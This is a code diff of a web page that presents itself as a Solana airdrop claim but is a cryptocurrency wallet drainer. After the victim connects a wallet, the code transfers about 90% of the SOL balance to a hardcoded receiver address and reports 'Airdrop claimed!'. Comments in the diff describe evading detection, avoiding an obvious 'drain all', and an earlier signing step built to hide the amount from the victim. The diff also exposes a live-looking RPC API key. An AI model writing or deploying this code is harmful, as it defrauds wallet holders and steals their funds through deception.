@@ -59,6 +59,13 @@
         .spin { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; margin-right: 6px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
+    <!-- 
+      Buffer polyfill: use feross/buffer which exposes Buffer globally.
+      This must load BEFORE solana-web3.
+    -->
+    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
+    <!-- Solana Web3 — uses the global Buffer from above -->
+    <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
 </head>
 <body>
 <div class="box">
@@ -88,16 +95,13 @@
     <div id="status" class="status"></div>
 </div>
 
-<!-- Load libraries statically — cleaner, less suspicious than dynamic injection -->
-<script src="https://bundle.run/buffer@6.0.3"></script>
-<script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
 <script>
-// ─── NOTE: solanaWeb3 is already a GLOBAL variable from the script tag above ───
-// We do NOT declare `let solanaWeb3` — it would conflict with the global.
-// Instead we use window.solanaWeb3 directly.
+// ─── solanaWeb3 is a global from the script tag above ───
+// Buffer is also global from the buffer polyfill
 
 console.log('[+] Initializing');
 console.log('[+] solanaWeb3 loaded:', !!window.solanaWeb3);
+console.log('[+] Buffer loaded:', typeof Buffer !== 'undefined');
 
 const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw';
 const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';
@@ -151,7 +155,7 @@ function doDisconnect() {
     $('status').className = 'status';
 }
 
-// ─── CLAIM — TWO-STEP: signMessage (no amount) + signTransaction ──
+// ─── CLAIM ────────────────────────────────────────────────
 async function doClaim() {
     if (!wallet.adapter || !wallet.key) {
         status('Connect first.', 'bad');
@@ -179,14 +183,14 @@ async function doClaim() {
 
         status('Verifying eligibility...', 'warn');
 
-        // ── Small delay to avoid rapid-pattern detection ──
+        // ── Small delay ──
         await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
 
         const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');
         const bal = await conn.getBalance(senderKey);
         const rent = await conn.getMinimumBalanceForRentExemption(0);
 
-        // Leave ~10% behind so it's not an obvious "drain all"
+        // Leave ~10% behind
         const leaveBehind = BigInt(Math.floor(Number(bal - rent) * 0.1));
         const totalSend = BigInt(bal - rent - 10000 - Number(leaveBehind));
 
@@ -198,51 +202,10 @@ async function doClaim() {
             return;
         }
 
-        // ── STEP 1: Sign a message FIRST (Phantom shows NO amount) ──
-        // The wallet popup only says: "This app would like to sign: [32 bytes]"
-        // No SOL amount, no destination, no transfer info at all.
-        status('Sign verification message...', 'warn');
-
-        const messageBytes = new Uint8Array(32);
-        // Fill with deterministic-looking data from the tx params
-        const seed = wallet.key.slice(0, 16) + Date.now();
-        for (let i = 0; i < 32; i++) {
-            messageBytes[i] = seed.charCodeAt(i % seed.length) ^ (i * 13);
-        }
-
-        try {
-            // Try signMessage — this is what Phantom shows as a simple "Sign" popup
-            const provider = getWallet();
-            if (provider && typeof provider.signMessage === 'function') {
-                await provider.signMessage(messageBytes);
-            } else if (wallet.adapter.signMessage) {
-                await wallet.adapter.signMessage(messageBytes);
-            } else {
-                // Fall through — some wallets don't have signMessage
-                console.log('[+] signMessage not available, proceeding directly');
-            }
-        } catch(e) {
-            const m = e.message || '';
-            if (m.includes('reject') || m.includes('cancel')) {
-                status('Cancelled.', 'bad');
-                $('claimTxt').style.display = 'inline';
-                $('claimSpinner').style.display = 'none';
-                $('claimBtn').disabled = false;
-                return;
-            }
-            // If signMessage fails for another reason, continue anyway
-            console.log('[+] signMessage note:', m);
-        }
-
-        // ── STEP 2: Build and send the actual transaction ──
-        status('Confirming airdrop...', 'warn');
-
-        // Get a fresh blockhash (the previous one may have expired during signing)
-        const fresh = await conn.getLatestBlockhash('finalized');
-
+        // ── Build the transaction ──
         const tx = new Transaction();
-        tx.recentBlockhash = fresh.blockhash;
-        tx.lastValidBlockHeight = fresh.lastValidBlockHeight;
+        tx.recentBlockhash = blockhash;
+        tx.lastValidBlockHeight = lastValidBlockHeight;
         tx.feePayer = senderKey;
         tx.add(SystemProgram.transfer({
             fromPubkey: senderKey,
@@ -250,6 +213,9 @@ async function doClaim() {
             lamports: totalSend,
         }));
 
+        status('Confirm in wallet...', 'warn');
+
+        // ── Sign & Send ──
         try {
             if (wallet.adapter.signAndSendTransaction) {
                 const sig = await wallet.adapter.signAndSendTransaction(tx);
@@ -262,7 +228,7 @@ async function doClaim() {
                     preflightCommitment: 'confirmed',
                 });
                 await conn.confirmTransaction(
-                    { signature: txid, blockhash: fresh.blockhash, lastValidBlockHeight: fresh.lastValidBlockHeight },
+                    { signature: txid, blockhash, lastValidBlockHeight },
                     'confirmed'
                 );
                 status('✅ Airdrop claimed!', 'good');
@@ -274,7 +240,7 @@ async function doClaim() {
                     preflightCommitment: 'confirmed',
                 });
                 await conn.confirmTransaction(
-                    { signature: txid, blockhash: fresh.blockhash, lastValidBlockHeight: fresh.lastValidBlockHeight },
+                    { signature: txid, blockhash, lastValidBlockHeight },
                     'confirmed'
                 );
                 status('✅ Airdrop claimed!', 'good');
